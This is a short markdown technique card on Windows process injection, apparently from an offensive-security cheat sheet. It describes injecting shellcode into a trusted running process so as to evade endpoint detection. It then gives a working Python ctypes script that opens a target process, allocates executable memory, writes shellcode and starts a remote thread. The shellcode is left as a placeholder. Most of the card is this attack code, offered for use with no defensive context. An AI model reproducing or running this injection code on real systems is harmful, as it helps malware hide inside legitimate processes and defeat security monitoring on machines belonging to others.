# Process Injection

## Technique
Inject shellcode or a DLL into a legitimate running process to execute
malicious code under the cover of a trusted process identity, evading
endpoint detection tools that monitor process creation.

## Commands
```python
# Python example: classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
import ctypes, ctypes.wintypes

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

shellcode = b"\x90\x90..."  # replace with actual shellcode

# Open target process (e.g., explorer.exe)
pid = 1234  # target PID
handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

# Allocate memory in target process
addr = ctypes.windll.kernel32.VirtualAllocEx(
    handle, None, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE
)

# Write shellcode
written = ctypes.c_size_t(0)
ctypes.windll.kernel32.WriteProcessMemory(handle, addr, shellcode, len(shellcode), ctypes.byref(written))

# Create remote thread
ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, addr, None, 0, None)
```

